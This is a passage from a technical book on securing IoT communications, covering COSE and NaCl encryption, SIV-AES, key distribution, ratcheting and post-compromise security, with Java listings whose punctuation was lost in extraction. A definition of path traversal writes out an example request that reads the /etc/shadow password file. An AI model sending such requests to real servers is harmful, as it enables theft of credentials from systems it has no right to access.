128-bit key for the message encryption, which requires installing Bouncy Castle as a cryptography provider. For this  example,  you  can  reuse  the  PSK  from  the  examples  in  section  12.2.1.  COSE requires  a  Recipient  object  to  be  created  for  each  recipient  of  a  message  and  the HKDF algorithm is specified at this level. This allows different key derivation or wrap- ping algorithms to be used for different recipients of the same message, but in this example, there’s only a single recipient. The algorithm is specified by adding an attri- bute to the recipient object. You should add these attributes to the PROTECTED header region,  to  ensure  they  are  authenticated.  The  random  nonce  is  also  added  to  the recipient object, as the HKDF_Context_PartyU_nonce attribute; I’ll explain the PartyU part shortly. You then create an EncryptMessage object and set some content for the message.  Here  I’ve  used  a  simple  string,  but  you  can  also  pass  any  array  of  bytes. Finally, you specify the content encryption algorithm as an attribute of the message  a variant of AES-CCM in this case  and then encrypt it.  Listing 12.13 Encrypting a message with COSE HKDF  Install Bouncy Castle to  get AES-CCM support.  Load the key  from the  keystore.  Security.addProvider new BouncyCastleProvider   ;      var keyMaterial = PskServer.loadPsk "changeit".toCharArray   ;      Encode the key as a COSE key object and add to the recipient.  The nonce is also set as an attribute on the recipient.  var recipient = new Recipient  ;                                 var keyData = CBORObject.NewMap                                          .Add KeyKeys.KeyType.AsCBOR  , KeyKeys.KeyType_Octet             .Add KeyKeys.Octet_K.AsCBOR  , keyMaterial ;             recipient.SetKey new OneKey keyData  ;                           The KDF algorithm is  recipient.addAttribute HeaderKeys.Algorithm,      specified as an attribute          AlgorithmID.HKDF_HMAC_SHA_256.AsCBOR  ,   of the recipient.

End-to-end security  471  The  HKDF  algorithm  in  COSE  supports  specifying  several  fields  in  addition  to  the PartyU nonce, as shown in table 12.4, which allows the derived key to be bound to sev- eral attributes, ensuring that distinct keys are derived for different uses. Each attribute can be set for either Party U or Party V, which are just arbitrary names for the partici- pants in a communication protocol. In COSE, the convention is that the sender of a message is Party U and the recipient is Party V. By simply swapping the Party U and Party V roles around, you can ensure that distinct keys are derived for each direction of communication, which provides a useful protection against reflection attacks. Each party can contribute a nonce to the KDF, as well as identity information and any other contextual information. For example, if your API can receive many different types of requests, you could include the request type in the context to ensure that different keys are used for different types of requests.  DEFINITION A  reflection  attack  occurs  when  an  attacker  intercepts  a  message from Alice to Bob and replays that message back to Alice. If symmetric mes- sage  authentication  is  used,  Alice  may  be  unable  to  distinguish  this  from  a genuine  message  from  Bob.  Using  distinct  keys  for  messages  from  Alice  to Bob than messages from Bob to Alice prevents these attacks.  Table 12.4 COSE HKDF context fields  Purpose  Field  PartyU identity  PartyV identity  PartyU nonce  PartyV nonce  PartyU other  PartyV other  An identifier for party U and V. This might be a username or domain name or some  other application-specific identifier.  Nonces contributed by either or both parties. These can be arbitrary random byte  arrays or integers. Although these could be simple counters it’s best to generate them  randomly in most cases.  Any application-specific additional context information that should be included in the  key derivation.  HKDF context fields can either be explicitly communicated as part of the message, or they can be agreed on by parties ahead of time and be included in the KDF computa- tion without being included in the message. If a random nonce is used, then this obvi- ously needs to be included in the message; otherwise, the other party won’t be able to guess it. Because the fields are included in the key derivation process, there is no need to separately authenticate them as part of the message: any attempt to tamper with them will cause an incorrect key to be derived. For this reason, you can put them in an UNPROTECTED header which is not protected by a MAC.   Although HKDF is designed for use with hash-based MACs, COSE also defines a variant of it that can use a MAC based on AES in CBC mode, known as HKDF-AES- MAC  this possibility was explicitly discussed in Appendix D of the original HKDF pro- posal, see https:  eprint.iacr.org 2010 264.pdf . This eliminates the need for a hash   472  CHAPTER 12 Securing IoT communications  function implementation, saving some code size on constrained devices. This can be particularly important on low-power devices because some secure element chips pro- vide hardware support for AES  and even public key cryptography  but have no sup- port for SHA-256 or other hash functions, requiring devices to fall back on slower and less efficient software implementations.  NOTE You’ll recall from chapter 11 that HKDF consists of two functions: an extract function that derives a master key from some input key material, and an expand function that derives one or more new keys from the master key. When  used  with  a  hash  function,  COSE’s  HKDF  performs  both  functions. When used with AES it only performs the expand phase; this is fine because the input key is already uniformly random as explained in chapter 11.8   In addition to symmetric authenticated encryption, COSE supports a range of public key  encryption  and  signature  options,  which  are  mostly  very  similar  to  JOSE,  so  I won’t cover them in detail here. One public key algorithm in COSE that is worth high- lighting in the context of IoT applications is support for elliptic curve Diffie-Hellman  ECDH  with static keys for both the sender and receiver, known as ECDH-SS. Unlike the  ECDH-ES  encryption  scheme  supported  by  JOSE,  ECDH-SS  provides  sender authentication, avoiding the need for a separate signature over the contents of each message. The downside is that ECDH-SS always derives the same key for the same pair of sender and receiver, and so can be vulnerable to replay attacks and reflection attacks, and lacks any kind of forward secrecy. Nevertheless, when used with HKDF and mak- ing use of the context fields in table 12.4 to bind derived keys to the context in which they are used, ECDH-SS can be a very useful building block in IoT applications.  Although COSE is in many ways better designed than JOSE and is starting to see wide adoption in standards such as FIDO 2 for hardware security keys  https:  fidoalliance .org fido2  , it still suffers from the same problem of trying to do too much. It sup- ports a wide variety of cryptographic algorithms, with varying security goals and quali- ties. At the time of writing, I counted 61 algorithm variants registered in the COSE algorithms registry  http:  mng.bz awDz , the vast majority of which are marked as recommended. This desire to cover all bases can make it hard for developers to know which algorithms to choose and while many of them are fine algorithms, they can lead to  security  issues  when  misused,  such  as  the  accidental  nonce  reuse  issues  you’ve learned about in the last few sections.       12.3.2 Alternatives to COSE  8  It’s unfortunate that COSE tries to handle both cases in a single class of algorithms. Requiring the expand function for HKDF with a hash function is inefficient when the input is already uniformly random. On the other hand, skipping it for AES is potentially insecure if the input is not uniformly random.   End-to-end security  473  SHA-3 and STROBE The US National Institute of Standards and Technology  NIST  recently completed an international competition to select the algorithm to become SHA-3, the successor to the widely used SHA-2 hash function family. To protect against possible future weak- nesses  in  SHA-2,  the  winning  algorithm   originally  known  as  Keccak   was  chosen partly because it is very different in structure to SHA-2. SHA-3 is based on an elegant and flexible cryptographic primitive known as a sponge construction. Although SHA-3 is relatively slow in software, it is well-suited to efficient hardware implementations. The  Keccak  team  have  subsequently  implemented  a  wide  variety  of  cryptographic primitives based on the same core sponge construction: other hash functions, MACs, and authenticated encryption algorithms. See https:  keccak.team for more details.  Mike Hamburg’s STROBE framework  https:  strobe.sourceforge.io  builds on top of the SHA-3 work to create a framework for cryptographic protocols for IoT applications. The design allows a single small core of code to provide a wide variety of crypto- graphic protections, making a compelling alternative to AES for constrained devices. If hardware support for the Keccak core functions becomes widely available, then frameworks like STROBE may become very attractive.  If you need standards-based interoperability with other software, the COSE can be a fine choice for an IoT ecosystem, so long as you approach it with care. In many cases, however, interoperability is not a requirement because you control all of the software and devices being deployed. In this a simpler approach can be adopted, such as using NaCl   the  Networking  and  Cryptography  Library;  https:  nacl.cr.yp.to   to  encrypt and authenticate a packet of data just as you did in chapter 6. You can still use CBOR or another compact binary encoding for the data itself, but NaCl  or a rewrite of it, like libsodium  takes care of choosing appropriate cryptographic algorithms, vetted by genuine experts. Listing 12.14 shows how easy it is to encrypt a CBOR object using NaCl’s SecretBox functionality  in this case through the pure Java Salty Coffee library you used in chapter 6 , which is roughly equivalent to the COSE example from the previous section. First you load or generate the secret key, and then you encrypt your CBOR data using that key.  Listing 12.14 Encrypting CBOR with NaCl  var key = SecretBox.key  ;        var cborMap = CBORObject.NewMap               .Add "foo", "bar"                     .Add "data", 12345 ;          var box = SecretBox.encrypt key, cborMap.EncodeToBytes   ;     System.out.println box ;  Generate some  CBOR data.  Create or load a key.  Encrypt  the data.  NaCl’s secret box is relatively well suited to IoT applications for several reasons:   It  uses  a  192-bit  per-message  nonce,  which  minimizes  the  risk  of  accidental nonce reuse when using randomly generated values. This is the maximum size   474  CHAPTER 12 Securing IoT communications  of nonce, so you can use a shorter value if you absolutely need to save space and pad it with zeroes before decrypting. Reducing the size increases the risk of accidental nonce reuse, so you should avoid reducing it to much less than 128 bits.   The XSalsa20 cipher and Poly1305 MAC used by NaCl can be compactly imple- mented in software on a wide range of devices. They are particularly suited to 32-bit architectures, but there are also fast implementations for 8-bit microcon- trollers.  They  therefore  make  a  good  choice  on  platforms  without  hardware AES support.   The 128-bit authentication tag use by Poly1305 is a good trade-off between secu- rity  and  message  expansion.  Although  stronger  MAC  algorithms  exist,  the authentication tag only needs to remain secure for the lifetime of the message  until it expires, for example , whereas the contents of the message may need to remain secret for a lot longer.  If  your  devices  are  capable  of  performing  public  key  cryptography,  then  NaCl  also provides convenient and efficient public key authenticated encryption in the form the CryptoBox  class,  shown  in  listing  12.15.  The  CryptoBox  algorithm  works  a  lot  like COSE’s ECDH-SS algorithm in that it performs a static key agreement between the two parties. Each party has their own key pair along with the public key of the other party  see section 12.4 for a discussion of key distribution . To encrypt, you use your own private key and the recipient’s public key, and to decrypt, the recipient uses their private key and your public key. This shows that even public key cryptography is not much more work when you use a well-designed library like NaCl.  WARNING Unlike  COSE’s  HKDF,  the  key  derivation  performed  in  NaCl’s crypto box doesn’t bind the derived key to any context material. You should make sure that messages themselves contain the identities of the sender and recipient and sufficient context to avoid reflection or replay attacks.  Listing 12.15 Using NaCl’s CryptoBox  var senderKeys = CryptoBox.keyPair  ;        var recipientKeys = CryptoBox.keyPair  ;     var cborMap = CBORObject.NewMap           .Add "foo", "bar"          .Add "data", 12345 ; var sent = CryptoBox.encrypt senderKeys.getPrivate  ,                   recipientKeys.getPublic  , cborMap.EncodeToBytes   ;     The sender and recipient  each have a key pair.  Encrypt using your  private key and  the recipient’s  public key.  var recvd = CryptoBox.fromString sent.toString   ; var cbor = recvd.decrypt recipientKeys.getPrivate  ,              senderKeys.getPublic   ;                          System.out.println CBORObject.DecodeFromBytes cbor  ;  The recipient  decrypts with their  private key and  your public key.   12.3.3 Misuse-resistant authenticated encryption  End-to-end security  475  Although NaCl and COSE can both be used in ways that minimize the risk of nonce reuse, they only do so on the assumption that a device has access to some reliable source  of  random  data.  This  is  not  always  the  case  for  constrained  devices,  which often lack access to good sources of entropy or even reliable clocks that could be used  for  deterministic  nonces.  Pressure  to  reduce  the  size  of  messages  may  also result in developers using nonces that are too small to be randomly generated safely. An  attacker  may  also  be  able  to  influence  conditions  to  make  nonce  reuse  more likely, such as by tampering with the clock, or exploiting weaknesses in network pro- tocols,  as  occurred  in  the  KRACK  attacks  against  WPA2   https:  www.krackattacks .com . In the worst case, where a nonce is reused for many messages, the algorithms in NaCl and COSE both fail catastrophically, enabling an attacker to recover a lot of information about the encrypted data and in some cases to tamper with that data or construct forgeries.   To avoid this problem, cryptographers have developed new modes of operation for  ciphers  that  are  much  more  resistant  to  accidental  or  malicious  nonce  reuse. These modes of operation achieve a security goal called misuse-resistant authenticated encryption   MRAE .  The  most  well-known  such  algorithm  is  SIV-AES,  based  on  a mode of operation known as Synthetic Initialization Vector  SIV; https:  tools.ietf.org  html rfc5297 .  In  normal  use  with  unique  nonces,  SIV  mode  provides  the  same guarantees as any other authenticated encryption cipher. But if a nonce is reused, a MRAE mode doesn’t fail as catastrophically: an attacker could only tell if the exact same message had been encrypted with the same key and nonce. No loss of authen- ticity or integrity occurs at all. This makes SIV-AES and other MRAE modes much safer to use in environments where it might be hard to guarantee unique nonces, such as IoT devices.  DEFINITION A cipher provides misuse-resistant authenticated encryption  MRAE  if accidental or deliberate nonce reuse results in only a small loss of security. An attacker can only learn if the same message has been encrypted twice with the same nonce and key and there is no loss of authenticity. Synthetic Initializa- tion Vector  SIV  mode is a well-known MRAE mode, and SIV-AES the most com- mon use of it.  SIV mode works by computing the nonce  also known as an Initialization Vector or IV  using a pseudorandom function  PRF  rather than using a purely random value or counter. Many MACs used for authentication are also PRFs, so SIV reuses the MAC used for authentication to also provide the IV, as shown in figure 12.8.  CAUTION Not all MACs are PRFs so you should stick to standard implementa- tions of SIV mode rather than inventing your own.   476  CHAPTER 12 Securing IoT communications  {“sensor”: “abc123”,”data”:…}  AES-SIV only needs an AES encryption circuit for all operations.  MAC key  AES-CMAC  IV  AES-CTR  Encryption  key  Authentication tag  Ciphertext  In SIV mode, the MAC tag is used as the IV for encryption.  Figure 12.8 SIV mode uses the MAC authentication tag as the IV for encryption. This  ensures that the IV will only repeat if the message is identical, eliminating nonce reuse  issues that can cause catastrophic security failures. SIV-AES is particularly suited to IoT  environments because it only needs an AES encryption circuit to perform all operations   even decryption .   The encryption process works by making two passes over the input:  1 First, a MAC is computed over the plaintext input and any associated data.9 The  MAC tag is known as the Synthetic IV, or SIV.  2 Then the plaintext is encrypted using a different key using the MAC tag from  step 1 as the nonce.  The security properties of the MAC ensure that it is extremely unlikely that two differ- ent messages will result in the same MAC tag, and so this ensures that the same nonce is not reused with two different messages. The SIV is sent along with the message, just as  a  normal  MAC  tag  would  be.  Decryption  works  in  reverse:  first  the  ciphertext  is decrypted using the SIV, and then the correct MAC tag is computed and compared with the SIV. If the tags don’t match, then the message is rejected.  WARNING Because the authentication tag can only be validated after the mes- sage has been decrypted, you should be careful not to process any decrypted data before this crucial authentication step has completed.  In SIV-AES, the MAC is AES-CMAC, which is an improved version of the AES-CBC- MAC used in COSE. Encryption is performed using AES in CTR mode. This means  9 The sharp-eyed among you may notice that this is a variation of the MAC-then-Encrypt scheme that we said in chapter 6 is not guaranteed to be secure. Although this is generally true, SIV mode has a proof of security so it is an exception to the rule.   End-to-end security  477  that SIV-AES has the same nice property as AES-CCM: it requires only an AES encryp- tion circuit for all operations  even decryption , so can be compactly implemented.  Side-channel and fault attacks Although SIV mode protects against accidental or deliberate misuse of nonces, it doesn’t protect against all possible attacks in an IoT environment. When an attacker may have direct physical access to devices, especially where there is limited physical protection or surveillance, you may also need to consider other attacks. A secure ele- ment chip can provide some protection against tampering and attempts to read keys directly from memory, but keys and other secrets may also leak though many side channels. A side channel occurs when information about a secret can be deduced by measuring physical aspects of computations using that secret, such as the following:   The timing of operations may reveal information about the key. Modern crypto- graphic  implementations  are  designed  to  be  constant  time  to  avoid  leaking information about the key in this way. Many software implementations of AES are  not  constant  time,  so  alternative  ciphers  such  as  ChaCha20  are  often preferred for this reason.   The amount of power used by a device may vary depending on the value of secret  data  it  is  processing.  Differential  power  analysis  can  be  used  to recover secret data by examining how much power is used when processing different inputs.   Emissions  produced  during  processing,  including  electromagnetic  radiation, heat, or  even sounds have all been  used to  recover secret data from cryp- tographic computations.  As well as passively observing physical aspects of a device, an attacker may also directly interfere with a device in an attempt to recover secrets. In a fault attack, an attacker disrupts the normal functioning of a device in the hope that the faulty oper- ation will reveal some information about secrets it is processing. For example, tweak- ing the power supply  known as a glitch  at a well-chosen moment might cause an algorithm to reuse a nonce, leaking information about messages or a private key. In some cases, deterministic algorithms such as SIV-AES can actually make fault attacks easier for an attacker.  Protecting against side-channel and fault attacks is well beyond the scope of this book. Cryptographic libraries and devices will document if they have been designed to resist these attacks. Products may be certified against standards such as FIPS 140-2 or Commons Criteria, which both provide some assurance that the device will resist some physical attacks, but you need to read the fine print to determine exactly which threats have been tested.  So  far,  the  mode  I’ve  described  will  always  produce  the  same  nonce  and  the  same ciphertext whenever the same plaintext message is encrypted. If you recall from chap- ter 6, such an encryption scheme is not secure because an attacker can easily tell if the same message has been sent multiple times. For example, if you have a sensor sending packets of data containing sensor readings in a small range of values, then an observer   478  CHAPTER 12 Securing IoT communications  may be able to work out what the encrypted sensor readings are after seeing enough of them. This is why normal encryption modes add a unique nonce or random IV in every message: to ensure that different ciphertext is produced even if the same mes- sage is encrypted. SIV mode solves this problem by allowing you to include a random IV in the associated data that accompanies the message. Because this associated data is also included in the MAC calculation, it ensures that the calculated SIV will be dif- ferent even if the message is the same. To make this a bit easier, SIV mode allows more than one associated data block to be provided to the cipher—up to 126 blocks in SIV-AES.   Listing 12.16 shows an example of encrypting some data with SIV-AES in Java using an open source library that implements the mode using AES primitives from Bouncy Castle.10 To include the library, open the pom.xml file and add the following lines to the dependencies section:               org.cryptomator         siv-mode         1.3.2         SIV mode requires two separate keys: one for the MAC and one for encryption and decryption. The specification that defines SIV-AES  https:  tools.ietf.org html rfc5297  describes how a single key that is twice as long as normal can be split into two, with the first  half  becoming  the  MAC  key  and  the  second  half  the  encryption  key.  This  is demonstrated in listing 12.16 by splitting the existing 256-bit PSK key into two 128-bit keys. You could also derive the two keys from a single master key using HKDF, as you learned in chapter 11. The library used in the listing provides encrypt   and decrypt   methods that take the encryption key, the MAC key, the plaintext  or ciphertext for decryption , and then any number of associated data blocks. In this example, you’ll pass in a header and a random IV. The SIV specification recommends that any ran- dom IV should be included as the last associated data block.  TIP The  SivMode  class  from  the  library  is  thread-safe  and  designed  to  be reused.  If  you  use  this  library  in  production,  you  should  create  a  single instance of this class and reuse it for all calls.

The answers are at the end of the chapter.  12.4 Key distribution and management  In a normal API architecture, the problem of how keys are distributed to clients and servers is solved using a public key infrastructure  PKI , as you learned in chapter 10. To recap:   In this architecture, each device has its own private key and associated public key.   The public key is packaged into a certificate that is signed by a certificate author-  ity  CA  and each device has a permanent copy of the public key of the CA.    When a device connects to another device  or receives a connection , it pres- ents its certificate to identify itself. The device authenticates with the associated private key to prove that it is the rightful holder of this certificate.   The recipient can verify the identity of the other device by checking that its cer- tificate is signed by the trusted CA and has not expired, been revoked, or in any other way become invalid.  This architecture can also be used in IoT environments and is often used for more capable devices. But constrained devices that lack the capacity for public key cryptog- raphy are unable to make use of a PKI and so other alternatives must be used, based   480  CHAPTER 12 Securing IoT communications  on symmetric cryptography. Symmetric cryptography is efficient but requires the API client and server to have access to the same key, which can be a challenge if there are a large number of devices involved. The key distribution techniques described in the next few sections aim to solve this problem.  12.4.1 One-off key provisioning  The  simplest  approach  is  to  provide  each  device  with  a  key  at  the  time  of  device manufacture or at a later stage when a batch of devices is initially acquired by an orga- nization. One or more keys are generated securely and then permanently stored in read-only  memory   ROM   or  EEPROM   electrically  erasable  programmable  ROM  on  the  device.  The  same  keys  are  then  encrypted  and  packaged  along  with  device identity information and stored in a central directory such as LDAP, where they can be accessed by API servers to authenticate and decrypt requests from clients or to encrypt responses to be sent to those devices. The architecture is shown in figure 12.9. A hard- ware security module  HSM  can be used to securely store the master encryption keys inside the factory to prevent compromise.   An alternative to generating completely random keys during manufacturing is to derive  device-specific  keys  from  a  master  key  and  some  device-specific  information. For example, you can use HKDF from chapter 11 to derive a unique device-specific key based on a unique serial number or ethernet hardware address assigned to each  Factory  HSM  A hardware security module  HSM  can be used to securely store master encryption keys and generate secure device keys.  Key provisioning  Device details + encrypted key  Device directory   LDAP   Device  Device  Device  Device details such as serial number together with the encrypted key are stored in a directory. APIs can access the directory to retrieve device keys.  Each device is supplied with a unique key during manufacturing.  Figure 12.9 Unique device keys can be generated and installed on a device during  manufacturing. The device keys are then encrypted and stored along with device  details in an LDAP directory or database. APIs can later retrieve the encrypted device  keys and decrypt them to secure communications with that device.   12.4.2 Key distribution servers  Key distribution and management  481  device. The derived key is stored on the device as before, but the API server can derive the  key  for  each  device  without  needing  to  store  them  all  in  a  database.  When  the device  connects  to  the  server,  it  authenticates  by  sending  the  unique  information  along with a timestamp or a random challenge to prevent replay , using its device key to create a MAC. The server can then derive the same device key from the master key and use this to verify the MAC. For example, Microsoft’s Azure IoT Hub Device Provisioning  Service  uses  a  scheme  similar  to  this  for  group  enrollment  of  devices using a symmetric key; for more information, see http:  mng.bz gg4l.  Rather  than  installing  a  single  key  once  when  a  device  is  first  acquired,  you  can instead periodically distribute keys to devices using a key distribution server. In this model, the device uses its initial key to enroll with the key distribution server and then is supplied with a new key that it can use for future communications. The key distribu- tion server can also make this key available to API servers when they need to commu- nicate with that device.   LEARN MORE The E4 product from Teserakt  https:  teserakt.io e4   includes a key distribution server that can distribute encrypted keys to devices over the MQTT messaging protocol. Teserakt has published a series of articles on the design of its secure IoT architecture, designed by respected cryptographers, at http:  mng.bz 5pKz.  Once  the  initial  enrollment  process  has  completed,  the  key  distribution  server  can periodically supply a fresh key to the device, encrypted using the old key. This allows the  device  to  frequently  change  its  keys  without  needing  to  generate  them  locally, which is important because constrained devices are often severely limited in access to sources of entropy.  Remote attestation and trusted execution Some devices may be equipped with secure hardware that can be used to establish trust in a device when it is first connected to an organization’s network. For example, the device might have a Trusted Platform Module  TPM , which is a type of hardware security  module   HSM   made  popular  by  Microsoft.  A  TPM  can  prove  to  a  remote server that it is a particular model of device from a known manufacturer with a par- ticular serial number, in a process known as remote attestation. Remote attestation is achieved using a challenge-response protocol based on a private key, known as an Endorsement Key  EK , that is burned into the device at manufacturing time. The TPM uses the EK to sign an attestation statement indicating the make and model of the device and can also provide details on the current state of the device and attached hardware. Because these measurements of the device state are taken by firmware running within the secure TPM, they provide strong evidence that the device hasn’t been tampered with.   482  CHAPTER 12 Securing IoT communications   continued  Although TPM attestation is strong, a TPM is not a cheap component to add to your IoT devices. Some CPUs include support for a Trusted Execution Environment  TEE , such as ARM TrustZone, which allows signed software to be run in a special secure mode  of  execution,  isolated  from  the  normal  operating  system  and  other  code. Although less resistant to physical attacks than a TPM, a TEE can be used to imple- ment security critical functions such as remote attestation. A TEE can also be used as a poor man’s HSM, providing an additional layer of security over pure software solutions.  Rather than writing a dedicated key distribution server, it is also possible to distribute keys using  an existing  protocol such as OAuth2. A draft standard for OAuth2  cur- rently expired, but periodically revived by the OAuth working group  describes how to  distribute  encrypted  symmetric  keys  alongside  an  OAuth2  access  token   http:   mng.bz 6AZy , and RFC 7800 describes how such a key can be encoded into a JSON Web  Token   https:  tools.ietf.org html rfc7800section-3.3 .  The  same  technique can be used with CBOR Web Tokens  http:  mng.bz oRaM . These techniques allow a device to be given a fresh key every time it gets an access token, and any API servers it  communicates  with  can  retrieve  the  key  in  a  standard  way  from  the  access  token itself or through token introspection. Use of OAuth2 in an IoT environment is dis- cussed further in chapter 13.  If  your  IoT  devices  are  sending  confidential  data  in  API  requests,  using  the  same encryption key for the entire lifetime of the device can present a risk. If the device key is  compromised,  then  an attacker  can  not only  decrypt  any future  communications but also all previous messages sent by that device. To prevent this, you need to use cryptographic mechanisms that provide forward secrecy as discussed in section 12.2. In that section, we looked at public key mechanisms for achieving forward secrecy, but you can also achieve this security goal using purely symmetric cryptography through a technique known as ratcheting.  DEFINITION Ratcheting in cryptography is a technique for replacing a symmet- ric key periodically to ensure forward secrecy. The new key is derived from the old key using a one-way function, known as a ratchet, because it only moves in one direction. It’s impossible to derive an old key from the new key so pre- vious conversations are secure even if the new key is compromised.  There are several ways to derive the new key from the old one. For example, you can derive the new key using HKDF with a fixed context string as in the following example:  var newKey = HKDF.expand oldKey, "iot-key-ratchet", 32, "HMAC" ;  12.4.3 Ratcheting for forward secrecy   Key distribution and management  483  TIP It is best practice to use HKDF to derive two  or more  keys: one is used for  HKDF  only,  to  derive  the  next  ratchet  key,  while  the  other  is  used  for encryption or authentication. The ratchet key is sometimes called a chain key or chaining key.  If the key is not used for HMAC, but instead used for encryption using AES or another algorithm,  then  you  can  reserve  a  particular  nonce  or  IV  value  to  be  used  for  the ratchet  and  derive  the  new  key  as  the  encryption  of  an  all-zero  message  using  that reserved IV, as shown in listing 12.17 using AES in Counter mode. In this example, a 128-bit IV of all 1-bits is reserved for the ratchet operation because it is highly unlikely that this value would be generated by either a counter or a randomly generated IV.  WARNING You should ensure that the special IV used for the ratchet is never used to encrypt a message.  Listing 12.17 Ratcheting with AES-CTR  Reserve a fixed IV that is used only for ratcheting.  private static byte[] ratchet byte[] oldKey  throws Exception {     var cipher = Cipher.getInstance "AES CTR NoPadding" ;     var iv = new byte[16];                    Arrays.fill iv,  byte  0xFF ;             cipher.init Cipher.ENCRYPT_MODE,             new SecretKeySpec oldKey, "AES" ,                  new IvParameterSpec iv  ;                  return cipher.doFinal new byte[32] ;        }  Initialize the cipher  using the old key and  the fixed ratchet IV.  Encrypt 32 zero bytes and use  the output as the new key.  After performing a ratchet, you should ensure the old key is scrubbed from memory so that it can’t be recovered, as shown in the following example:  var newKey = ratchet key ; Arrays.fill key,  byte  0 ;       key = newKey;           Overwrite the old  key with zero bytes.  Replace the old key  with the new key.  TIP In Java and similar languages, the garbage collector may duplicate the contents of variables in memory, so copies may remain even if you attempt to wipe the data. You can use ByteBuffer.allocateDirect   to create off-heap memory that is not managed by the garbage collector.  Ratcheting only works if both the client and the server can determine when a ratchet occurs; otherwise, they will end up using different keys. You should therefore perform ratchet operations at well-defined moments. For example, each device might ratchet its key at midnight every day, or every hour, or perhaps even after every 10 messages.11  11 The Signal secure messaging service is famous for its “double ratchet” algorithm  https:  signal.org docs   specifications doubleratchet  , which ensures that a fresh key is derived after every single message.   484  CHAPTER 12 Securing IoT communications  12.4.4 Post-compromise security  The rate at which ratchets should be performed depends on the number of requests that the device sends, and the sensitivity of the data being transmitted.    Ratcheting after a fixed number of messages can help to detect compromise: if an attacker is using a device’s stolen secret key, then the API server will receive extra mes- sages in addition to any the device sent and so will perform the ratchet earlier than the legitimate device. If the device discovers that the server is performing ratcheting earlier than expected, then this is evidence that another party has compromised the device secret key.  Although  forward  secrecy  protects  old  communications  if  a  device  is  later  compro- mised, it says nothing about the security of future communications. There have been many stories in the press in recent years of IoT devices being compromised, so being able to recover security after a compromise is a useful security goal, known as post- compromise security.  DEFINITION Post-compromise security  or future secrecy  is achieved if a device can ensure  security  of  future  communications  after  a  device  has  been  compro- mised. It should not be confused with forward secrecy which protects confiden- tiality of past communications.  Post-compromise  security  assumes  that  the  compromise  is  not  permanent,  and  in most cases it’s not possible to retain security in the presence of a persistent compro- mise. However, in some cases it may be possible to re-establish security once the com- promise  has  ended.  For  example,  a  path  traversal  vulnerability  might  allow  a  remote attacker to view the contents of files on a device, but not modify them. Once the vul- nerability is found and patched, the attacker’s access is removed.  DEFINITION A path traversal vulnerability occurs when a web server allows an attacker  to  access  files  that  were  not  intended  to  be  made  available  by manipulating the URL path in requests. For example, if the web server pub- lishes  data  under  a   data  folder,  an  attacker  might  send  a  request  for  data .. .. .. etc shadow.12  If  the  webserver  doesn’t  carefully  check  paths, then it may serve up the local password file.  If the attacker manages to steal the long-term secret key used by the device, then it can be impossible to regain security without human involvement. In the worst case, the device may need to be replaced or restored to factory settings and reconfigured. The ratcheting  mechanisms  discussed  in  section  12.4.3  do  not  protect  against  compro- mise, because if the attacker ever gains access to the current ratchet key, they can eas- ily calculate all future keys.  12 Real path-traversal exploits are usually more complex than this, relying on subtle bugs in URL parsing routines.   Key distribution and management  485   Hardware security measures, such as a secure element, TPM, or TEE  see sec- tion 12.4.1  can provide post-compromise security by ensuring that an attacker never directly gains access to the secret key. An attacker that has active control of the device can  use  the  hardware  to  compromise  communications  while  they  have  access,  but once that access is removed, they will no longer be able to decrypt or interfere with future communications.   A weaker form of post-compromise security can be achieved if an external source of key material is mixed into a ratcheting process periodically. If the client and server can agree on such key material without the attacker learning it, then any new derived keys will be unpredictable to the attacker and security will be restored. This is weaker than using secure hardware, because if the attacker has stolen the device’s key, then, in principle, they can eavesdrop or interfere with all future communications and inter- cept or control this key material. However, if even a single communication exchange can occur without the attacker interfering, then security can be restored.   There are two main methods to exchange key material between the server and  the client:   They can directly exchange new random values encrypted using the old key. For  example,  a  key  distribution  server  might  periodically  send  the  client  a new key encrypted with the old one, as described in section 12.4.2, or both parties might send random nonces that are mixed into the key derivation pro- cess used in ratcheting  section 12.4.3 . This is the weakest approach because a passive attacker who is able to eavesdrop can use the random values directly to derive the new keys.   They can use Diffie-Hellman key agreement with fresh random  ephemeral  keys to derive new key material. Diffie-Hellman is a public key algorithm in which the client and server only exchange public keys but use local private keys to derive a shared  secret.  Diffie-Hellman  is  secure  against  passive  eavesdroppers,  but  an attacker who is able to impersonate the device with a stolen secret key may still be able to perform an active man-in-the-middle attack to compromise security. IoT devices deployed in accessible locations may be particularly vulnerable to man- in-the-middle attacks because an attacker could have physical access to network connections.  DEFINITION A man-in-the-middle  MitM  attack occurs when an attacker actively interferes with communications and impersonates one or both parties. Proto- cols such as TLS contain protections against MitM attacks, but they can still occur if long-term secret keys used for authentication are compromised.  Post-compromise security is a difficult goal to achieve and most solutions come with costs in terms of hardware requirements or more complex cryptography. In many IoT applications, the budget would be better spent trying to avoid compromise in the first place, but for particularly sensitive devices or data, you may want to consider adding a secure element or other hardware security mechanism to your devices.   486  CHAPTER 12 Securing IoT communications  Pop quiz 7  True or False: Ratcheting can provide post-compromise security.

Summary   IoT  devices  may  be  constrained  in  CPU  power,  memory,  storage  or  network capacity, or battery life. Standard API security practices, based on web protocols and  technologies,  are poorly suited to  such environments and  more  efficient alternatives should be used.   UDP-based network protocols can be protected using Datagram TLS. Alterna- tive cipher suites can be used that are better suited to constrained devices, such as those using AES-CCM or ChaCha20-Poly1305.   X.509 certificates are complex to verify and require additional signature valida- tion and parsing code, increasing the cost of supporting secure communications. Pre-shared  keys  can  eliminate  this  overhead  and  use  more  efficient  symmetric cryptography. More capable devices can combine PSK cipher suites with ephem- eral Diffie-Hellman to achieve forward secrecy.   IoT communications often need to traverse multiple network hops employing different transport protocols. End-to-end encryption and authentication can be used to ensure that confidentiality and integrity of API requests and responses are not compromised if an intermediate host is attacked. The COSE standards provide similar capabilities to JOSE with better suitability for IoT devices, but alternatives such as NaCl can be simpler and more secure.   Summary  487   Constrained devices often lack access to good sources of entropy to generate ran- dom nonces, increasing the risk of nonce reuse vulnerabilities. Misuse-resistant authentication encryption modes, such as SIV-AES, are a much safer choice for such devices and offer similar benefits to AES-CCM for code size.   Key  distribution  is  a  complex  problem  for  IoT  environments,  which  can  be solved through simple key management techniques such as the use of key dis- tribution servers. Large numbers of device keys can be managed through key derivation, and ratcheting can be used to ensure forward secrecy. Hardware security features provide additional protection against compromised devices.   Securing IoT APIs  This chapter covers  Authenticating devices to APIs  Avoiding replay attacks in end-to-end device   authentication   Authorizing things with the OAuth2 device grant  Performing local access control when a device   is offline  In chapter 12, you learned how to secure communications between devices using Datagram TLS  DTLS  and end-to-end security. In this chapter, you’ll learn how to secure  access  to  APIs  in  Internet  of  Things   IoT   environments,  including  APIs provided by the devices themselves and cloud APIs the devices connect to. In its rise to become the dominant API 